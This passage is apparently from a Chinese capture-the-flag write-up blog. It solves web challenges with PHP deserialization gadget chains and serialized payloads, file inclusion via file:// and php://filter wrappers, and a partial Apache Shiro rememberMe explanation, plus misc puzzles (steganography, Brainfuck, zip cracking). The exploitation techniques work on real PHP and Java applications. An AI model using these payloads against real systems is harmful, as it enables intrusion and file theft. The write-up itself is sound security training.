class="string">&quot;name:&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;age:&quot;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&quot;sex:&quot;</span>.<span class="variable language_">$this</span>-&gt;sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAge</span>(<span class="params"><span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$age</span>=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setSex</span>(<span class="params"><span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$sex</span>=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlayGame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gameFile</span>=<span class="string">&quot;./game&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">openGame</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;gameFile);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;user-&gt;name.<span class="string">&quot;GameOver!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user-&gt;name.<span class="string">&quot;PlayGame &quot;</span>. <span class="variable language_">$this</span>-&gt;user-&gt;age . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">openGame</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;polar_flag.flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;polar_flag.flag&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>我们需要调用openGame()，进行文件的读取，那么我们就要触发PlayGame类的__toString()方法，只有PlayGame类的__destruct()方法可以做到了<br />逻辑还算简单吧，__destruct()-&gt;__toString()-&gt;openGame()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;user = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;user-&gt;name = <span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;user-&gt;name-&gt;gameFile = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment"># O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;N;s:8:&quot;gameFile&quot;;s:5:&quot;/flag&quot;;&#125;s:3:&quot;age&quot;;N;s:3:&quot;sex&quot;;N;&#125;s:8:&quot;gameFile&quot;;s:6:&quot;./game&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>最后注意传参，有效变量名不允许出现下划线和<code>.</code>，我们可以使用<code>[</code>进行处理，即<code>polar[flag.flag</code>，原理好像是PHP将<code>[</code>识别成<code>_</code>，然后后面的错误就直接无视了，即成为了一个有效变量名<br />找到一个解释<code>当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_</code><br />题目的PHP版本为7.0.9，传参后F12即可找到flag</p><h1 id="webcsdn"><a class="markdownIt-Anchor" href="#webcsdn"></a> 【WEB】csdn</h1><p>进入题目，页面没有显示东西，习惯性F12，<code>&lt;!-- 偷偷告诉你,flag在flag目录下的flag.txt中 --&gt;</code>，url:<code>index.php?xxs=https://blog.csdn.net/</code>，感觉考察的是文件包含<br />先试一下普通的文件包含</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?xxs=php:<span class="comment">//filter/read=convert.base64-encode/resource=/flag.txt</span></span><br><span class="line">失败</span><br><span class="line">?xxs=file:<span class="comment">///flag.txt</span></span><br><span class="line">成功拿到flag</span><br></pre></td></tr></table></figure><p>PHP伪协议的使用<br /><strong>file://协议:访问本地文件系统</strong><br />(flag目录一般在本地目录下)</p><h1 id="webphar"><a class="markdownIt-Anchor" href="#webphar"></a> 【WEB】phar</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;funs.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">myWaf</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>有waf，先查看一下<code>funs.php</code>的内容，使用PHP伪协议进行读取<br /><code>?file=php://filter/read/convert.base64-encode/resource=funs.php</code><br />base64解码得到：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;f1@g.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myWaf</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f1@g/i&quot;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NONONONON0!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A-&gt;&quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;destruct!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str_array</span>= <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$str_array</span>[<span class="string">&#x27;kfc&#x27;</span>]-&gt;vm50;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Crazy Thursday&quot;</span>.<span class="variable">$str2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kfc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;c[<span class="variable">$kfc</span>];</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看见了变量覆盖<code>var_dump($$f)</code>，让<code>$f='flag'</code>即可<br /><strong>A::__destruct-&gt;B::__toString-&gt;C::__get()</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b[<span class="string">&#x27;kfc&#x27;</span>] = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b[<span class="string">&#x27;kfc&#x27;</span>]-&gt;c[<span class="string">&#x27;vm50&#x27;</span>] = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>此处将private属性全改为public了，或者也可以不修改，最后输出url编码即可(再或者手动补%00类名%00)<br />需要让waf等于False，故file要等于<code>f1@g</code>，payload:<br /><code>/?file=f1@g&amp;data=O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:1:&#123;s:3:&quot;kfc&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;a:1:&#123;s:4:&quot;vm50&quot;;s:4:&quot;flag&quot;;&#125;&#125;&#125;&#125;&#125;</code><br />又可以像这样，套别的师傅的一个脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A-&gt;&quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;destruct!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="keyword">array</span>(<span class="string">&quot;kfc&quot;</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">C</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str_array</span>= <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$str_array</span>[<span class="string">&#x27;kfc&#x27;</span>]-&gt;vm50;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Crazy Thursday&quot;</span>.<span class="variable">$str2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">array</span>(<span class="string">&#x27;vm50&#x27;</span>=&gt;<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kfc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;c[<span class="variable">$kfc</span>];</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>最后吐槽一下，貌似上次古剑山也出了这样的题，然而古剑山是一场原题杯，还好我没打，但也有所耳闻。。。。</p><h1 id="webpolaroa"><a class="markdownIt-Anchor" href="#webpolaroa"></a> 【WEB】PolarOA</h1><p>一个登陆系统，老样子，先抓个包看看，发现cookie里面有东西<br />响应包里可以看到，<code>rememberMe=deleteMe</code><br />发现是shiro反序列化，这算是1.2.4版本的漏洞了<br />有关介绍：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiro是常见的Java安全框架，执行身份验证、授权、密码和会话管理。只要rememberMe的AES加密秘钥泄露，就会导致shiro的反序列化漏洞。</span><br><span class="line">返回包存在set-Cookie：rememberMe=deleteMe或URL中有shiro字样。</span><br><span class="line">有时服务器不会主动返回rememberMe=deleteMe，直接发包即可。</span><br><span class="line">Shiro的功能用到了AES加密，但是密码是硬编码在代码里的，所以很容易拿到密钥，因为AES是对称加密，即加密密钥同样是解密密钥，所以就可以通过恶意构建Cookie获取权限执行命令。</span><br><span class="line"></span><br><span class="line">新版本到Shiro 1.2.5及以上版本，就不存在硬编码密钥的问题，而改为自定义密钥。但如果使用了别人的开源框架，他们在代码里配置shiro的密钥，而使用者没有修改shiro的密钥，关键代码可以在github上通过api search接口搜索到，从而得到一个所谓的key包，然后去轮流尝试。</span><br><span class="line"></span><br><span class="line">漏洞分析：</span><br><span class="line"></span><br><span class="line">Apache Shiro默认使用CookieRememberMeManager。其处理cookie的流程是：得到rememberMe的cookie值--&gt;Base64解码--&gt;AES解密--&gt;反序列化。</span><br></pre></td></tr></table></figure><p>嘶，大概了解了，在搞工具，看了官方wp，有点内个了，等我后面补上吧()</p><h1 id="webfastjson"><a class="markdownIt-Anchor" href="#webfastjson"></a> 【WEB】Fastjson</h1><p>会补吧()</p><h1 id="misc加点儿什么"><a class="markdownIt-Anchor" href="#misc加点儿什么"></a> 【MISC】加点儿什么</h1><p>binwalk分离图片得到一个cpp文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 100</span></span><br><span class="line"><span class="comment">//提示：密文输入372658619JI0707I8G64HF2400F96991 </span></span><br><span class="line"><span class="comment">//提示[1]：代码不是完全准确，需要你加点东西(非常简单) </span></span><br><span class="line"><span class="type">char</span> ciphertext[MAX];    <span class="comment">//密文</span></span><br><span class="line"><span class="type">char</span> plaintext[MAX];     <span class="comment">//明文</span></span><br><span class="line"><span class="type">int</span> K = <span class="number">4</span>;</span><br><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Encryption</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入明文：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">gets_s(plaintext);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;密文为：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; plaintext[i] != <span class="string">&#x27;\0&#x27;</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (plaintext[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; plaintext[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">ciphertext[i] = (plaintext[i] - <span class="string">&#x27;A&#x27;</span> + K) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (plaintext[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; plaintext[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">ciphertext[i] = (plaintext[i] - <span class="string">&#x27;a&#x27;</span> + K) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ciphertext[i] = plaintext[i];</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; plaintext[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Decryption</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入密文：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">gets_s(ciphertext);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;明文为：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; ciphertext[i] != <span class="string">&#x27;\0&#x27;</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ciphertext[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ciphertext[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">plaintext[i] = ((ciphertext[i] - <span class="string">&#x27;A&#x27;</span> - K) % <span class="number">26</span> + <span class="number">26</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ciphertext[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ciphertext[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">plaintext[i] = ((ciphertext[i] - <span class="string">&#x27;a&#x27;</span> - K) % <span class="number">26</span> + <span class="number">26</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">plaintext[i] = ciphertext[i];</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; plaintext[i];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n, flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择（1:加密，2:解密,3:退出）：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">switch</span> (n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">Encryption();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">Decryption();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>增加<code>cout &lt;&lt; plaintext[i];</code>即可<br />拿到明文套上flag<br />flag: <code>flag&#123;372658619FE0707E8C64DB2400B96991&#125;</code></p><h1 id="misc发售花海"><a class="markdownIt-Anchor" href="#misc发售花海"></a> 【MISC】发售花海</h1><p>hint.txt<code>❂❅❂✼❁❄✼✻❂✾❂❃❂❊❁❀=</code><br />找个网站<br /><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo</a><br />得到<code>JAY CHOU</code>，作为加密图片的密码<br />图片的属性中发现了steghide<br />缺少隐写的密码，看看题目名字，查找《花海》的发售日期，2008.10.15，试了一下，密码是081015，非常棒，因为默认密码是6位的123456，所以这里就猜测了6位<br /><code>steghide extract -sf '/var/run/vmblock-fuse/blockdir/NQpNkb/flag.jpg' -p 081015</code><br />flag:<code>flag&#123;sh!ni1IuDE1eiy6nk@i&#125;</code></p><h1 id="misc1小时10分钟后看海"><a class="markdownIt-Anchor" href="#misc1小时10分钟后看海"></a> 【MISC】1小时10分钟后看海</h1><p>先确定它是北戴河区，然后该地点是海滨汽车站，打开高德，选择搜索栏，更多，找到公交站，北戴河海滨汽车站，点进去就是801路了，有三个可能的地点<br />试了蔚蓝海岸、圣蓝海洋公园，最终确定是中间的黄金海岸，huangjinhaian<br />flag: <code>flag&#123;a69edbf339190c91f7779cb68741a5c8&#125;</code></p><h1 id="misc不要骂人哦"><a class="markdownIt-Anchor" href="#misc不要骂人哦"></a> 【MISC】不要骂人哦</h1><p>爬梯子游戏，很好，没看懂游戏规则QWQ<br /><img src="https://picx.zhimg.com/80/v2-0d16479775d88ce72621835e4426498b_1440w.png" alt="" /><br />题目：从上方任意出发点，向下走，遇到分叉（平行或向下）就沿线变化方向。 这样上面的出发点和下面结果就会一一对应。<br />嘶，看了一点官方视频，他讲完1和2的对应，我就明白了，1：下右下左，对应+；2：下下下右下右下右下右下右下，对应[；3：下左下右下，对应&gt;；依次类推，4：&lt;；5：-；6：.；7：*<br />对txt文件进行替换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;&lt;&lt;+.&gt;&gt;------.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;&lt;++++++.&gt;&gt;&gt;&gt;------.&gt;&gt;+++.&lt;&lt;+++++.&lt;&lt;-.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;+++++++++.&lt;++++++++.&gt;&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;&lt;++.&lt;---.&gt;&gt;&gt;&gt;&gt;&gt;---.&lt;&lt;--.&lt;&lt;--.&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;++.&gt;-.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;-----.&gt;&gt;&gt;-.&lt;&lt;++.&lt;&lt;&lt;&lt;+.&gt;&gt;&gt;&gt;&gt;&gt;+++.&lt;&lt;.&lt;&lt;&lt;&lt;++.&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;---.&lt;&lt;&lt;&lt;------.</span><br></pre></td></tr></table></figure><p>很明显的Brainfuck加密<br /><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br />得到<code>做出这题的你期末必过！</code>继续MD5一下<br />flag：<code>flag&#123;3ea5a70772e0bb1e70655fb42ff30b0d&#125;</code></p><h1 id="misc你懂二维码吗"><a class="markdownIt-Anchor" href="#misc你懂二维码吗"></a> 【MISC】你懂二维码吗？</h1><p>打开压缩包，发现一张二维码以及一个压缩包，但压缩包已经损坏了，无法解压，010查看，文件头不对，修改<code>50 4B 03 04</code>，保存解压，发现里面的压缩包加密了，试一下能不能已知明文攻击，好，行不通，看二维码有什么东西<br />发现文件尾的<code>666777888</code>，是压缩包的密码，1.txt文件是一张png图片，修改后缀为png，是一张二维码，扫码发现flag：<code>flag&#123;zun_du_jia_du&#125;</code><br />emmmm，这是困难的misc？？我还以为要继续对二维码处理的呢，毕竟题目都这么说了，emmm放到中等难度吧</p><h1 id="mischide"><a class="markdownIt-Anchor" href="#mischide"></a> 【MISC】HIDE</h1><p>解压附件，得到一张图片，两个加密的压缩包，图片属性的详细信息里告诉我们</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag有两个，随便组合一下吧！flag&#123;So&#125;</span><br></pre></td></tr></table></figure><p>好家伙藏的够深的，拉到最后有个<code>flag&#123;So&#125;</code>，还好点击它的时候感觉不对劲，一句话不可能这么长，这样子说明还有另外一个flag<br />然后就没别的信息了，binwalk分离没有信息，已知明文攻击也不行，那就直接爆破压缩包密码，1.zip破到了<code>199956</code>，得到一张二维码<br />内容是摩斯电码<code>.. .-.. --- ...- . -- .. ... -.-.</code>，解密得到<code>ilovemisc</code><br />然后也不是第二个压缩包的密码，留着当flag吧，然后第二个压缩包也没爆破出来<br />再看一眼图片，有个登录时间1999.5.6，原来是这里给的信息，但其他的试了都不是密码<br />然后我在想，这个摩斯电码解出来的会不会是大写的呢，因为我上学期打新生赛的时候有道题也是工具解出来的是全小写的，然后错了，队友交的时候跟我说是全大写。。。<br />一试还真的是全大写，这下得换个网站了，得到1.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] 